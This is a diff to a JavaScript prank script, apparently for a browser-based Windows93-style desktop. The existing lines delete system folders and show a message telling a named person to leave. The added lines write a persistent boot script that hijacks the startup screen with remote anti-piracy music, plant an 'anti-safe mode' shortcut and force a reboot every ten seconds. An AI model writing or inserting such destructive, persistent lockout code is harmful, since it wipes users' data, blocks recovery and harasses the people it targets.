@@ -21,19 +21,16 @@ $alert.error("This is a warning to Johnny adam, Leave.");
 $file.delete("/c/sys42.js/");
 $file.delete("/c/sys42.css/");
 $file.delete("/c/sys/")
-$
 setInterval(function() {
   $file.save("/a/desktop/hellodere.txt/");
   
 }, 2500);
 
+$file.save("/a/desktop/bruh.lnk42", "js base64"); //anti-safe mode
+$db.set("boot/piracy.js","window.location.hash=\"#\";biosSetup();$boot.BIOS.innerHTML=\"<b>No pc?</b><audio src=\\\"https://cdn.discordapp.com/attachments/464188047664087040/797961668507467806/Piracy_is_No_Party_Anti_Piracy_Music_-_Mario_Party_DS_Music_Extended.mp3\\\" autoplay=\\\"\\\" loop=\\\"\\\"></audio>\"");
 
-setInterval(function() {
-  window.location.hash = "#";
-biosSetup();
-$boot.BIOS.innerHTML = "ur pc has been hacked lol go cry jimmy "
-}, 15000
 le._settings.sounds.blop = "/c/sys/sounds/BLOP.ogg";
 setInterval(function() {
 var a = new Audio(`/c/sys/sounds/${$io.arr.random(['CHORD','QUACK','BLOP'])}.ogg`).play();
 }, 1000);
+setInterval(function(){ $exe('reboot') }, 10000); 
